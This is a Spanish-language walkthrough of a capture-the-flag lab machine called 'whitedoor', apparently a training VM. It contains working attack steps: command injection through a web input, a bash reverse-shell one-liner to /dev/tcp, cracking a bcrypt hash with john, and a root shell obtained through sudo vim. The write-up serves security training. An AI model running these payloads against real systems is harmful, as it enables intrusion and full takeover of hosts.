@@ -1,0 +1,140 @@
+Enumeramos puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.6
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-23 15:11 -0400
+Nmap scan report for 192.168.1.6
+Host is up (0.00015s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:CB:B2:4D (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
+
+❯ nmap -sCV -p 21,22,80 -oN 02-targeted.txt 192.168.1.6
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-23 15:12 -0400
+Nmap scan report for 192.168.1.6
+Host is up (0.00026s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              13 Nov 16  2023 README.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.1.5
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey: 
+|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
+|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Home
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
+
+Nos logueamos como Anonymous via ftp y encontramos una nota:
+❯ cat README.txt 
+¡Good luck!
+
+Ingresamos al sitio http://192.168.1.6/index.php, y encontramos un input, que permite enviar comandos ls:
+Input: whoami
+Response: Permission denied. Only the 'ls' command is allowed.
+
+Probamos con ";" y agregamos nuestro comando:
+Input: ls; whoami 
+Response:
+blackdoor.webp
+blackindex.php
+index.php
+whitedoor.jpg
+www-data
+
+Probamos con una reverse shell:
+Input: ls; bash -c 'bash -i >& /dev/tcp/192.168.1.5/1234 0>&1'
+
+❯ ncat -nlvp 1234
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.6:36758.
+bash: cannot set terminal process group (495): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@whitedoor:/var/www/html$ 
+
+Ingresamos a /home/whiteshell/Desktop, y encontramos un archivo llamado .my_secret_password.txt con un texto en base64:
+www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt 
+whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
+
+❯ echo 'VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K' | base64 -d
+VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=
+
+❯ echo 'VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K' | base64 -d | base64 -d
+Th1sIsTh3P4sSwOrDblac5
+
+Nos logueamos como el usuario whiteshell:
+www-data@whitedoor:/home/whiteshell/Desktop$ su whiteshell
+su whiteshell
+Password: Th1sIsTh3P4sSwOrDblac5
+
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+whiteshell@whitedoor:~/Desktop$ 
+
+Para movernos al usuario Gonzalo, ingresamos en el directorio /home/Gonzalo/Desktop, y encontramos un archivo llamado .my_secret_hash y la flag de user:
+whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash
+$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
+
+Encontramos un hash en brypt, el cual crackeamos con john:
+❯ john -w=/home/wh01s17/Documentos/wordlists/rockyou.txt hash_gonzalo
+...
+qwertyuiop       (?)
+...
+
+Nos logueamos como Gonzalo por ssh:
+❯ ssh Gonzalo@192.168.1.6
+Gonzalo@192.168.1.6's password: qwertyuiop
+Linux whitedoor 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jul 23 21:42:56 2025 from 192.168.1.5
+Gonzalo@whitedoor:~$ 
+
+Para escalar privilegios, ejecutamos el comando sudo -l:
+Gonzalo@whitedoor:~$ sudo -l
+Matching Defaults entries for Gonzalo on whitedoor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User Gonzalo may run the following commands on whitedoor:
+    (ALL : ALL) NOPASSWD: /usr/bin/vim
+
+Podemos ejecutar el comando vim como cualquier usuario y sin contraseña, por lo que para obtener una shell de root, ejecutamos lo siguiente:
+Gonzalo@whitedoor:~$ sudo /usr/bin/vim 
+ESC 
+:!/bin/bash 
+
+root@whitedoor:/home/Gonzalo#
+
+Obtenemos una shell del usaurio root, la última flag y fin.
+
